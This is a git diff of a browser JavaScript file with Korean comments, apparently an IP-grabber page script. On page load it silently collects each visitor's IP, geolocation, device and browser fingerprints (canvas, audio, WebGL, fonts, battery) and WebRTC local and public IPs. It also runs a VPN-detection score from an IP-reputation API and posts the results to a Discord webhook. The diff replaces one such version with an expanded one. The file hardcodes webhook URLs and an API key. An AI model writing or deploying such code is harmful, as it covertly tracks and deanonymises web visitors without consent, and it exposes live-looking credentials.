@@ -1,18 +1,23 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn';
+/*****************************
+ * CONFIG
+ *****************************/
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1447962446915571846/J6hqwWgxsvjCmg1Q1Q7jRdFiHVex67Yhc9DcNVm7xCcMnAe9TqYfLl0n27ShmFcXdpKx";
+const IPQS_KEY = "n0hXiA0tP5MMGuctT84vLRAdCfTdUvrE";
 
-let visitorInfo = {};
-
+/*****************************
+ * 기본 환경 및 디바이스 정보 함수
+ *****************************/
 function getDeviceInfo() {
     return {
         platform: navigator.platform,
         userAgent: navigator.userAgent,
         language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
-        cpuCores: navigator.hardwareConcurrency || 'N/A',
-        touchPoints: navigator.maxTouchPoints || 0,
+        languages: navigator.languages?.join(", ") ?? "N/A",
+        cpuCores: navigator.hardwareConcurrency ?? "N/A",
+        touchPoints: navigator.maxTouchPoints ?? 0,
         cookieEnabled: navigator.cookieEnabled,
-        onlineStatus: navigator.onLine ? '온라인' : '오프라인',
-        doNotTrack: navigator.doNotTrack || 'N/A'
+        onlineStatus: navigator.onLine ? "온라인" : "오프라인",
+        doNotTrack: navigator.doNotTrack ?? "N/A"
     };
 }
 
@@ -27,355 +32,338 @@ function getScreenInfo() {
         colorDepth: screen.colorDepth,
         pixelDepth: screen.pixelDepth,
         pixelRatio: window.devicePixelRatio || 1,
-        orientation: screen.orientation ? screen.orientation.type : 'N/A'
+        orientation: screen.orientation?.type ?? "N/A"
     };
 }
 
 function getNetworkInfo() {
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
-        return {
-            effectiveType: connection.effectiveType || 'N/A',
-            downlink: connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
-            rtt: connection.rtt ? `${connection.rtt}ms` : 'N/A',
-            saveData: connection.saveData ? '활성화' : '비활성화'
-        };
-    }
-    return {
-        effectiveType: 'N/A',
-        downlink: 'N/A',
-        rtt: 'N/A',
-        saveData: 'N/A'
-    };
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return c
+        ? {
+              effectiveType: c.effectiveType ?? "N/A",
+              downlink: c.downlink ? `${c.downlink} Mbps` : "N/A",
+              rtt: c.rtt ? `${c.rtt}ms` : "N/A",
+              saveData: c.saveData ? "활성화" : "비활성화"
+          }
+        : {
+              effectiveType: "N/A",
+              downlink: "N/A",
+              rtt: "N/A",
+              saveData: "N/A"
+          };
 }
 
 function getBrowserInfo() {
     const ua = navigator.userAgent;
-    let browserName = 'Unknown';
-    let browserVersion = 'Unknown';
+    let name = "Unknown",
+        ver = "Unknown";
 
-    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
-        browserName = 'Chrome';
-        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
-    } else if (ua.indexOf('Firefox') > -1) {
-        browserName = 'Firefox';
-        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
-    } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
-        browserName = 'Safari';
-        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
-    } else if (ua.indexOf('Edg') > -1) {
-        browserName = 'Edge';
-        browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
+    if (ua.includes("Chrome") && !ua.includes("Edg")) {
+        name = "Chrome";
+        ver = ua.match(/Chrome\/([\d.]+)/)?.[1] ?? "Unknown";
+    } else if (ua.includes("Firefox")) {
+        name = "Firefox";
+        ver = ua.match(/Firefox\/([\d.]+)/)?.[1] ?? "Unknown";
+    } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+        name = "Safari";
+        ver = ua.match(/Version\/([\d.]+)/)?.[1] ?? "Unknown";
+    } else if (ua.includes("Edg")) {
+        name = "Edge";
+        ver = ua.match(/Edg\/([\d.]+)/)?.[1] ?? "Unknown";
     }
 
-    return { browserName, browserVersion };
+    return { browserName: name, browserVersion: ver };
 }
 
 function getOSInfo() {
     const ua = navigator.userAgent;
-    let osName = 'Unknown';
-
-    if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
-    else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
-    else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
-    else if (ua.indexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
-    else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
-    else if (ua.indexOf('Linux') > -1) osName = 'Linux';
-    else if (ua.indexOf('Android') > -1) osName = 'Android';
-    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';
-
-    return osName;
+    if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
+    if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
+    if (ua.includes("Windows NT 6.2")) return "Windows 8";
+    if (ua.includes("Windows NT 6.1")) return "Windows 7";
+    if (ua.includes("Mac OS X")) return "macOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+    return "Unknown";
 }
 
 async function getBatteryInfo() {
     try {
-        if ('getBattery' in navigator) {
-            const battery = await navigator.getBattery();
+        if ("getBattery" in navigator) {
+            const b = await navigator.getBattery();
             return {
-                level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging ? '충전 중' : '충전 안 함',
-                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
-                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
+                level: Math.round(b.level * 100) + "%",
+                charging: b.charging ? "충전 중" : "충전 안 함",
+                chargingTime: b.chargingTime === Infinity ? "N/A" : `${Math.round(b.chargingTime / 60)}분`,
+                dischargingTime: b.dischargingTime === Infinity ? "N/A" : `${Math.round(b.dischargingTime / 60)}분`
             };
         }
     } catch {}
-    return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+    return { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
 }
 
 function getMemoryInfo() {
     try {
-        if ('memory' in performance) {
-            const memory = performance.memory;
-            return {
-                usedJSHeapSize: `${Math.round(memory.usedJSHeapSize / 1024 / 1024)} MB`,
-                totalJSHeapSize: `${Math.round(memory.totalJSHeapSize / 1024 / 1024)} MB`,
-                jsHeapSizeLimit: `${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)} MB`
-            };
-        }
-    } catch {}
-    return { usedJSHeapSize: 'N/A', totalJSHeapSize: 'N/A', jsHeapSizeLimit: 'N/A' };
+        const m = performance.memory;
+        return {
+            usedJSHeapSize: `${(m.usedJSHeapSize / 1024 / 1024).toFixed(1)} MB`,
+            totalJSHeapSize: `${(m.totalJSHeapSize / 1024 / 1024).toFixed(1)} MB`,
+            jsHeapSizeLimit: `${(m.jsHeapSizeLimit / 1024 / 1024).toFixed(1)} MB`
+        };
+    } catch {
+        return { usedJSHeapSize: "N/A", totalJSHeapSize: "N/A", jsHeapSizeLimit: "N/A" };
+    }
 }
 
 function getPluginsInfo() {
-    const plugins = [];
     try {
-        for (let i = 0; i < navigator.plugins.length; i++) {
-            const plugin = navigator.plugins[i];
-            plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
-        }
-    } catch {}
-    return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
+        return [...navigator.plugins].map(p => p.name).join(", ") || "N/A";
+    } catch {
+        return "N/A";
+    }
 }
 
 function getWebGLInfo() {
     try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-                vendor: gl.getParameter(gl.VENDOR),
-                renderer: gl.getParameter(gl.RENDERER),
-                version: gl.getParameter(gl.VERSION),
-                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
-                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
-            };
-        }
-    } catch {}
-    return {
-        vendor: 'N/A',
-        renderer: 'N/A',
-        version: 'N/A',
-        shadingLanguageVersion: 'N/A',
-        unmaskedVendor: 'N/A',
-        unmaskedRenderer: 'N/A'
-    };
+        const c = document.createElement("canvas");
+        const gl = c.getContext("webgl");
+        if (!gl) return { vendor: "N/A", renderer: "N/A" };
+
+        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+        return {
+            vendor: gl.getParameter(gl.VENDOR),
+            renderer: gl.getParameter(gl.RENDERER),
+            unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
+            unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A"
+        };
+    } catch {
+        return { vendor: "N/A", renderer: "N/A" };
+    }
 }
 
 function getCanvasFingerprint() {
     try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillText('Canvas fingerprint ????', 2, 2);
-        return canvas.toDataURL().slice(-50);
+        const c = document.createElement("canvas");
+        const ctx = c.getContext("2d");
+        ctx.font = "16px Arial";
+        ctx.fillText("Fingerprint", 2, 2);
+        return c.toDataURL().slice(-40);
     } catch {
-        return 'N/A';
+        return "N/A";
     }
 }
 
 function getAudioFingerprint() {
     try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const analyser = audioContext.createAnalyser();
-        const gainNode = audioContext.createGain();
-
-        oscillator.connect(analyser);
-        analyser.connect(gainNode);
-        gainNode.connect(audioContext.destination);
-
-        oscillator.frequency.value = 10000;
-        gainNode.gain.value = 0;
-
-        const dataArray = new Float32Array(analyser.frequencyBinCount);
-        analyser.getFloatFrequencyData(dataArray);
-
-        audioContext.close();
-
-        return dataArray.slice(0, 10).join(',').slice(0, 50);
+        const a = new AudioContext();
+        const osc = a.createOscillator();
+        const analyser = a.createAnalyser();
+        osc.connect(analyser);
+        analyser.connect(a.destination);
+        osc.start();
+        const arr = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(arr);
+        a.close();
+        return arr.slice(0, 8).join(",");
     } catch {
-        return 'N/A';
+        return "N/A";
     }
 }
 
 function getFontsInfo() {
-    const fonts = [
-        'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
-        'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
-        'Arial Narrow', 'Tahoma', 'Geneva', 'Century Gothic', 'Lucida Console', 'Monaco',
-        'Courier', 'Bradley Hand ITC', 'Brush Script MT', 'Luminari', 'Chalkduster'
-    ];
+    const fonts = ["Arial", "Helvetica", "Times New Roman", "Verdana", "Courier New", "Georgia"];
+    const base = document.createElement("canvas");
+    const ctx = base.getContext("2d");
+    ctx.font = "40px monospace";
+    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
 
-    const availableFonts = [];
-    const testString = 'mmmmmmmmmmlli';
-    const testSize = '72px';
-
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-
-    context.font = testSize + ' monospace';
-    const baselineWidth = context.measureText(testString).width;
-
-    fonts.forEach(font => {
-        context.font = testSize + ' ' + font + ', monospace';
-        const width = context.measureText(testString).width;
-        if (width !== baselineWidth) {
-            availableFonts.push(font);
-        }
-    });
-
-    return availableFonts.length > 0 ? availableFonts.slice(0, 10).join(', ') : 'N/A';
-}
-
-function getStorageInfo() {
-    try {
-        const info = {
-            localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
-            sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
-            indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
-            webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
-        };
-
-        if ('storage' in navigator && 'estimate' in navigator.storage) {
-            navigator.storage.estimate().then(estimate => {
-                info.quota = `${Math.round(estimate.quota / 1024 / 1024)} MB`;
-                info.usage = `${Math.round(estimate.usage / 1024 / 1024)} MB`;
-            });
-        }
-
-        return info;
-    } catch {
-        return { localStorage: 'N/A', sessionStorage: 'N/A', indexedDB: 'N/A', webSQL: 'N/A' };
-    }
-}
-
-function getMediaDevicesInfo() {
-    return new Promise(async (resolve) => {
-        try {
-            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                resolve({
-                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
-                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
-                    videoInput: devices.filter(d => d.kind === 'videoinput').length
-                });
-            } else {
-                resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
-            }
-        } catch {
-            resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
-        }
-    });
+    return fonts.filter(f => {
+        ctx.font = `40px ${f}, monospace`;
+        return ctx.measureText("mmmmmmmmmmlli").width !== baseWidth;
+    }).join(", ");
 }
 
 function getTimezoneInfo() {
-    try {
-        const date = new Date();
-        return {
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: date.getTimezoneOffset(),
-            dst: date.getTimezoneOffset() < new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
-            locale: Intl.DateTimeFormat().resolvedOptions().locale
-        };
-    } catch {
-        return { timezone: 'N/A', timezoneOffset: 'N/A', dst: 'N/A', locale: 'N/A' };
-    }
+    return {
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        locale: Intl.DateTimeFormat().resolvedOptions().locale,
+        offset: new Date().getTimezoneOffset()
+    };
 }
 
-function getPerformanceInfo() {
-    try {
-        const nav = performance.getEntriesByType('navigation')[0];
-        return {
-            loadTime: Math.round(nav.loadEventEnd - nav.fetchStart) + 'ms',
-            domContentLoaded: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) + 'ms',
-            pageLoadTime: Math.round(performance.now()) + 'ms'
-        };
-    } catch {
-        return { loadTime: 'N/A', domContentLoaded: 'N/A', pageLoadTime: 'N/A' };
-    }
+/*****************************
+ * WebRTC + NAT + VPN 탐지
+ *****************************/
+function detectNATType(candidates) {
+    if (!candidates.length) return "Unknown";
+    if (candidates.some(c => c.includes("relay"))) return "Symmetric NAT (VPN 가능성 매우 높음)";
+    if (candidates.some(c => c.includes("srflx"))) return "Restricted NAT";
+    return "Full Cone / Unknown";
 }
 
-async function collectAndSendInfo() {
-    try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        visitorInfo.ip = ipData.ip;
+async function getWebRTCInfo() {
+    return new Promise(resolve => {
+        const result = { localIPs: [], publicIPs: [], blocked: false, vpnLikely: "Unknown", natType: "Unknown" };
+        let done = false;
 
-        try {
-            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
-            const locationData = await locationResponse.json();
+        const pc = new RTCPeerConnection({
+            iceServers: [
+                { urls: "stun:stun.l.google.com:19302" },
+                { urls: "stun:stun.cloudflare.com:3478" }
+            ]
+        });
 
-            if (locationData.status === 'success') {
-                visitorInfo.location = {
-                    country: locationData.country,
-                    countryCode: locationData.countryCode,
-                    region: locationData.regionName,
-                    city: locationData.city,
-                    isp: locationData.isp,
-                    org: locationData.org,
-                    timezone: locationData.timezone,
-                    lat: locationData.lat,
-                    lon: locationData.lon
-                };
+        pc.createDataChannel("x");
+
+        const candidates = [];
+
+        pc.onicecandidate = e => {
+            if (!e.candidate) return;
+
+            const c = e.candidate.candidate;
+            candidates.push(c);
+
+            const ip = c.match(/\d+\.\d+\.\d+\.\d+/)?.[0];
+            if (!ip) return;
+
+            if (c.includes("host") && !result.localIPs.includes(ip)) result.localIPs.push(ip);
+            if ((c.includes("srflx") || c.includes("relay")) && !result.publicIPs.includes(ip))
+                result.publicIPs.push(ip);
+        };
+
+        pc.createOffer()
+            .then(o => pc.setLocalDescription(o))
+            .catch(() => { result.blocked = true; done = true; resolve(result); });
+
+        setTimeout(() => {
+            if (done) return;
+            done = true;
+
+            result.natType = detectNATType(candidates);
+
+            if (window._realIP && result.publicIPs.length) {
+                result.vpnLikely = result.publicIPs.includes(window._realIP) ? "No" : "Yes";
             }
-        } catch {}
 
-        const now = new Date();
-        visitorInfo.timestamp = now.toISOString();
-        visitorInfo.localTime = now.toLocaleString('ko-KR');
-        visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            resolve(result);
+        }, 3000);
+    });
+}
 
-        visitorInfo.device = getDeviceInfo();
-        visitorInfo.browser = getBrowserInfo();
-        visitorInfo.os = getOSInfo();
-        visitorInfo.screen = getScreenInfo();
-        visitorInfo.network = getNetworkInfo();
-        visitorInfo.battery = await getBatteryInfo();
-        visitorInfo.memory = getMemoryInfo();
-        visitorInfo.plugins = getPluginsInfo();
-        visitorInfo.webgl = getWebGLInfo();
-        visitorInfo.canvasFingerprint = getCanvasFingerprint();
-        visitorInfo.audioFingerprint = getAudioFingerprint();
-        visitorInfo.fonts = getFontsInfo();
-        visitorInfo.storage = getStorageInfo();
-        visitorInfo.mediaDevices = await getMediaDevicesInfo();
-        visitorInfo.timezone = getTimezoneInfo();
-        visitorInfo.performance = getPerformanceInfo();
-        visitorInfo.url = window.location.href;
-        visitorInfo.referrer = document.referrer || '직접 접속';
+/*****************************
+ * IPQualityScore (핵심)
+ *****************************/
+async function fetchIPQualityScore(ip) {
+    try {
+        const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_KEY}/${ip}`);
+        return await res.json();
+    } catch {
+        return null;
+    }
+}
 
+/*****************************
+ * VPN Score 계산
+ *****************************/
+function calculateVPNScore(info) {
+    let s = 0;
+
+    // IPQS 비중 가장 큼
+    if (info.ipqs.vpn) s += 50;
+    if (info.ipqs.proxy) s += 30;
+    if (info.ipqs.tor) s += 70;
+    if (info.ipqs.recent_abuse) s += 15;
+    s += Math.min(30, Math.round((info.ipqs.fraud_score || 0) / 3));
+
+    // WebRTC 비교
+    if (info.webrtc.vpnLikely === "Yes") s += 20;
+    if (info.webrtc.natType.includes("Symmetric")) s += 10;
+
+    return Math.min(100, s);
+}
+
+/*****************************
+ * 메인 실행
+ *****************************/
+async function collectAndSend() {
+    try {
+        // Real IP
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await ipRes.json();
+        window._realIP = ip;
+
+        // 위치
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+
+        // IPQualityScore
+        const ipqs = await fetchIPQualityScore(ip);
+
+        // WebRTC
+        const webrtc = await getWebRTCInfo();
+
+        const vpnScore = calculateVPNScore({ ipqs, webrtc });
+        const conclusion =
+            vpnScore >= 80 ? "VPN/프록시 사용 매우 강하게 의심"
+            : vpnScore >= 50 ? "VPN/프록시 가능성 있음"
+            : "VPN 가능성 낮음";
+
+        /***********************
+         * Discord Embed 생성
+         ***********************/
         const embed = {
-            title: "새로운 방문자 정보",
-            description: "사용자가 페이지에 접속했습니다.",
+            title: "새로운 방문자 정보 (IP 분석 + IPQualityScore)",
             color: 0x5865F2,
-            timestamp: visitorInfo.timestamp,
-            thumbnail: {
-                url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
-            },
             fields: [
                 {
                     name: "기본 정보",
-                    value: `**IP 주소:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**조직:** ${visitorInfo.location?.org || 'N/A'}\n**접속 시간:** ${visitorInfo.localTime}`,
-                    inline: true
+                    value:
+                        `IP: ${ip}\n` +
+                        `ISP: ${loc.isp}\n` +
+                        `국가/도시: ${loc.country} / ${loc.city}`,
+                    inline: false
                 },
                 {
-                    name: "위치 정보",
-                    value: `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**지역:** ${visitorInfo.location?.region || 'N/A'}\n**도시:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**시간대:** ${visitorInfo.timezone.timezone}`,
-                    inline: true
+                    name: "IPQualityScore 분석",
+                    value:
+                        `VPN: ${ipqs.vpn}\n` +
+                        `Proxy: ${ipqs.proxy}\n` +
+                        `TOR: ${ipqs.tor}\n` +
+                        `Fraud Score: ${ipqs.fraud_score}\n` +
+                        `최근 악용 기록: ${ipqs.recent_abuse}`,
+                    inline: false
                 },
                 {
-                    name: "접속 정보",
-                    value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
+                    name: "WebRTC 분석",
+                    value:
+                        `차단 여부: ${webrtc.blocked}\n` +
+                        `Local IP: ${webrtc.localIPs.join(", ") || "N/A"}\n` +
+                        `Candidate IP: ${webrtc.publicIPs.join(", ") || "N/A"}\n` +
+                        `NAT 타입: ${webrtc.natType}\n` +
+                        `WebRTC 기반 VPN 추정: ${webrtc.vpnLikely}`,
+                    inline: false
+                },
+                {
+                    name: "최종 판단",
+                    value:
+                        `VPN 점수: ${vpnScore} / 100\n` +
+                        `판정: **${conclusion}**`,
                     inline: false
                 }
             ],
             footer: { text: "자동 수집 시스템" }
         };
 
-        const payload = { embeds: [embed] };
-
         await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
         });
 
-    } catch (error) {
-        console.error('정보 수집/전송 실패:', error);
+    } catch (err) {
+        console.log("오류 발생:", err);
     }
 }
 
-window.addEventListener('load', collectAndSendInfo);
+window.addEventListener("load", collectAndSend);
